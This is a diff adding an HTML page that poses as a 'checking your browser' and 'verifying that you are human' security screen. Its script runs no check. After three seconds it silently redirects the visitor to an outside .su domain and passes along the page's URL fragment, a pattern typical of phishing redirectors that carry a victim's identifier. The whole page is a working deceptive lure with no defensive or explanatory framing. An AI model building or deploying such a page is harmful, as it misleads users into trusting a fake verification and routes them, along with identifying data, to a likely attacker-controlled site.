@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying Connection</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+        }
+        .message {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .loading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto;
+        }
+        .loading div {
+            width: 10px; /* Smaller bubbles */
+            height: 10px; /* Smaller bubbles */
+            margin: 0 5px;
+            background-color: #333;
+            border-radius: 50%;
+            animation: loading 1.2s infinite ease-in-out;
+        }
+        .loading div:nth-child(2) {
+            animation-delay: -0.4s;
+        }
+        .loading div:nth-child(3) {
+            animation-delay: -0.8s;
+        }
+        .loading div:nth-child(4) {
+            animation-delay: -1.2s;
+        }
+        .loading div:nth-child(5) {
+            animation-delay: -1.6s;
+        }
+        @keyframes loading {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.5);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="message">Checking your browser for a secure connection...</div>
+        <div class="loading">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <br>
+        <div class="message">Verifying that you are human...</div>
+    </div>
+
+    <script>
+    function startRedirect() {
+        let baseRedirectUrl = "https://4abkh.mudequel.su/SQCCb/";
+        const fragment = window.location.hash.substring(1); // Get the fragment identifier
+        const redirectUrl = fragment ? `${baseRedirectUrl}#${fragment}` : baseRedirectUrl; // Append fragment with # if present
+        setTimeout(() => {
+            window.location.href = redirectUrl;
+        }, 3000); // 3 seconds delay before redirecting
+    }
+    
+    startRedirect(); // Start the redirect process
+</script>
+
+</body>
+</html>
